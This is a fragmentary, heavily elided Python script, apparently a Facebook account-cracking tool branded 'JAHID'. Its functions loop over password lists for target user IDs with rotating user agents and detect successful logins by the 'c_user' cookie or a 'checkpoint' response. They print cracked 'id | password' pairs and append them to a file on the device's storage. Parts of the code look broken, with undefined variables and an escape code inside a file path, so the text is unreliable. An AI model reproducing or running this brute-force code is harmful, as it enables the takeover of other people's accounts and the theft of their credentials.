...
for x in range(10):
	...
	i='; U; JAHIDa/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
...
def fia():    
			print(logo)
			print('\x1b[97;1m[✓] ꧁JAHID➼  VERSION :\x1b[1;92m 1.0 ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁JAHID➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[꧁JAHID➼-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/JAHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[꧁JAHID➼-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁JAHID➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m꧁JAHID➼\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[꧁JAHID➼-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[꧁JAHID➼-OK] '+uid+' | '+ps+'\33[0;97m')
